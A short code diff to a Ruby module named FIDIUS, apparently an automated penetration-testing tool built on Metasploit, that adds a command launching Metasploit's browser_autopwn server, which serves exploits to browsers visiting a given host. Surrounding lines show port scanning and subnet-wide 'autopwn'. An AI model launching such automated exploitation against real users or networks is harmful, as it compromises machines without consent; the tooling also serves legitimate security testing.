@@ -206,6 +206,13 @@ module FIDIUS
       run_exploit "auxiliary/scanner/portscan/tcp", options
     end
 
+    def cmd_start_browser_autopwn args, task = nil
+      options = {'LHOST' => args[0], 'SRVHOST' => args[0], 'URIPATH' => '/' }
+      puts "start browser autopwn: #{options}"
+      run_exploit "server/browser_autopwn", options
+      puts "end browser autopwn: #{options}"
+    end
+
     def autopwn iprange, lhost, task = nil
       manager = SubnetManager.new @framework, iprange, 1, nil, lhost
       my_ip = get_my_ip iprange
